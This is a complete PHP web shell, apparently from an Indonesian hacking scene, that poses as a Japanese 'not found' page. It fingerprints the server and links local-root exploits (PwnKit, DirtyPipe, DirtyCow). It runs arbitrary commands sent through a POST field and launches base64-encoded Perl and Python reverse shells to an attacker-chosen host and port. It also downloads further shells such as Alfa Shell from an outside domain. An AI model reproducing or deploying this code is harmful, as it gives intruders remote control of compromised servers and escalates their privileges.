<?php
/**
	Author tikushaxor
	Kalau mau recode, silahkan asal sertakan nama author
	Recode ga menyertakan nama author? Koe ancene Lonthe
*/
error_reporting(0);
echo "<html>
<head>
	<meta name='robots' content='noindex'/>
 <title>
	見つかりません
 </title>
</head>
<body>
<img src='https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/d5a30244-7dcd-4acc-a472-cbd2bd37a1dc/d9bzdfr-a8f3182d-af2e-458c-8911-4e31f2764fda.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcL2Q1YTMwMjQ0LTdkY2QtNGFjYy1hNDcyLWNiZDJiZDM3YTFkY1wvZDliemRmci1hOGYzMTgyZC1hZjJlLTQ1OGMtODkxMS00ZTMxZjI3NjRmZGEuZ2lmIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.aTnZYYN_dCMj50kuLcAddNCOl-Kp3iI8yN-V6G5B_l4' style='position: fixed; bottom: -50px; left: -50px;'>
</html>";
$mynameyangsuperkeren="angga1337@localhost: ";
$lokalroot="<br>  LOCALROOT PKEXEC: ";
$linklokalroot="[<a style=text-decoration:none href='https://github.com/arthepsy/CVE-2021-4034'><font color=#0000FF>HERE</font></a>]";
$lokalroot1="<br>  LOCALROOT DIRTYPIPE: ";
$linklokalroot1="[<a style=text-decoration:none href='https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits'><font color=#0000FF>HERE</font></a>]";
$lokalroot2="<br>  LOCALROOT DIRTYCOW: ";
$linklokalroot2="[<a style=text-decoration:none href='https://github.com/firefart/dirtycow'><font color=#0000FF>HERE</font></a>]";
$softwaretolol="<font color=#0000FF>Software: </font>";
$awalandirektori="<font color=#0000FF><br>Path: </font>";
$direktorijancok= getcwd();
$kontol="<font color=#0000FF>Uname: </font>";
$ikiipnecok="<font color=#0000FF>Server IP: </font>";
$memek="<font color=#0000FF>Disable Function: </font>";
$ikiosrilis="<font color=#0000FF>OS: </font>";
$sekiso="<font color=#0000FF><br>Useful: </font>";
$ikigcccok="GCC: ";
$ikicurlcok="  CURL: ";
$ikiwgetcok="  WGET: ";
$ikiperlcok="  PERL: ";
$ikipythoncok="  PYTHON: ";
$ikirubycok="  RUBY: ";
$ikipkexeccok="  PKEXEC: ";
$on="[<font color=#008000>ON</font>]";
$off="[<font color=#FF0000>OFF</font>]";
echo $kontol . php_uname() . "<br>";
	$disfunc = @ini_get("disable_functions");
if(empty($disfunc)){
	$anu = "<gr>NONE</gr>";
} else {
	$anu = "<rd>$disfunc</rd>";
}
echo $memek . $anu . "<br>";
$ipnecok = $_SERVER['SERVER_ADDR'];
echo $ikiipnecok . $ipnecok . "<br>";
	$ngecekosrilisbangsat = shell_exec('grep PRETTY /etc/os-*elease');
if(empty($ngecekosrilisbangsat)){
	$osrilisasu = "Not Readable or Not Found";
} else {
	$osrilisasu = "$ngecekosrilisbangsat";
}
echo $ikiosrilis . $osrilisasu . "<br>";
echo $softwaretolol . $_SERVER['SERVER_SOFTWARE'] . "<br>";
echo $sekiso;
$outputgcc = shell_exec('gcc --version');
if(empty($outputgcc)){
	$asu = $off;
} else {
	$asu = $on;
}
echo $ikigcccok . $asu;
$outputcurl = shell_exec('curl -V');
if(empty($outputcurl)){
	$asu1 = $off;
} else {
	$asu1 = $on;
}
echo $ikicurlcok . $asu1;
$outputwget = shell_exec('wget -V');
if(empty($outputwget)){
	$asu2 = $off;
} else {
	$asu2 = $on;
}
echo $ikiwgetcok . $asu2;
$outputperl = shell_exec('perl -v');
if(empty($outputperl)){
	$asu3 = $off;
} else {
	$asu3 = $on;
}
echo $ikiperlcok . $asu3;
$outputpython = shell_exec('python --version');
if(empty($outputpython)){
	$asu4 = $off;
} else {
	$asu4 = $on;
}
echo $ikipythoncok . $asu4;
$outputruby = shell_exec('ruby -v');
if(empty($outputruby)){
	$asu5 = $off;
} else {
	$asu5 = $on;
}
echo $ikirubycok . $asu5;
$outputpkexec = shell_exec('ls -la /usr/bin/pkexec');
if(empty($outputpkexec)){
	$asu6 = $off;
} else {
	$asu6 = $on;
}
echo $ikipkexeccok . $asu6;
echo $lokalroot . $linklokalroot;
echo $lokalroot1 . $linklokalroot1;
echo $lokalroot2 . $linklokalroot2 . "<br>";
echo $awalandirektori . $direktorijancok;
// function installer
function op($d, $e) {
	$fp = fopen($d, "w");
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $e);
	curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_FILE, $fp);
	return curl_exec($ch);
	curl_close($ch);
	fclose($fp);
	ob_flush();
	flush();
}
function exe($cmd) {
if(function_exists('system')) {
	@ob_start();
	@system($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif(function_exists('exec')) {
	@exec($cmd,$results);
	$buff = "";
foreach($results as $result) {
	$buff .= $result;
	} return $buff;
} elseif(function_exists('passthru')) {
	@ob_start();
	@passthru($cmd);
	$buff = @ob_get_contents();
	@ob_end_clean();
	return $buff;
} elseif(function_exists('shell_exec')) {
	$buff = @shell_exec($cmd);
	return $buff;
	}
}
if($_POST['bc'] == 'perl'){
	$bc = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
	$plbc = @fopen('bc.pl','w');
	fwrite($plbc,$bc);
	$out = exe("perl bc.pl ".$_POST['server']." ".$_POST['port']." 1>/dev/null 2>&1 &");
	sleep(1);
	echo "<pre>$out\n".exe("ps aux | grep bc.pl")."</pre>";
	unlink("bc.pl");
}

if($_POST['bc'] == 'python'){
	$bc_py = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
	$pbc_py = @fopen('bcpy.py','w');
	fwrite($pbc_py,$bc_py);
	$out_py = exe("python bcpy.py ".$_POST['server']." ".$_POST['port']);
	sleep(1);
	echo "<pre>$out_py\n".exe("ps aux | grep bcpy.py")."</pre>";
	unlink("bcpy.py");
}
if($_POST['anuanu']) {
$cmdgoblok = $_POST['anuanu'];
}
// installer
switch ($_POST['op']) {
case ('alfa'):
switch (true) {
case (op('alfa.php', 'https://random-php.ftp.sh/alfa.txt')):
	$hasil = '<b><a href="./alfa.php" target="_blank">alfa.php</a> > </b>ok!';
	}
	break;
case ('adminer'):
switch (true) {
case (op('adminer.php', 'https://random-php.ftp.sh/adminer.txt')):
	$hasil = '<b><a href="./adminer.php" target="_blank">adminer.php</a> > </b>ok!';
	}
}
echo "
	<form method='POST'>
	<select name='op'>
		<option selected disabled>select</option>
		<!- di sini bisa tambah lagi aja shell rawnya ->
		<option value='alfa'>Alfa Shell</option>
		<option value='adminer'>Adminer</option>
	</select>
		<button type='submit'>Install</button>
	</form>
	<pre>$hasil</pre>
		<form method='POST'>
			<div class='input-group mb-3'>
				<i>$mynameyangsuperkeren</i><input class='form-control btn-sm' type='text' name='anuanu' value='$cmdgoblok' placeholder='uname -a'>
				<input type='submit' value='Execute'>
				<i>Server : </i><input type='text' name='server' placeholder='127.0.0.1'>
				<i>Port : </i><input type='text' name='port' placeholder='1337'>
				<select name='bc'>
				<option value='perl'>Perl</option>
				<option value='python'>Python</option>
				</select>
				<input type='submit' value='Connect'><br>
				<div style='border: 1px #000000 solid; padding: 10px;background-color:#FFFFFF; text-align: left;height:100%; margin-top:10px;'>
				<pre>~$&nbsp;$cmdgoblok<br>"; system($_POST['anuanu'].' 2>&1'); echo "</pre>
			</div>
		</div>
	</form>
<br>";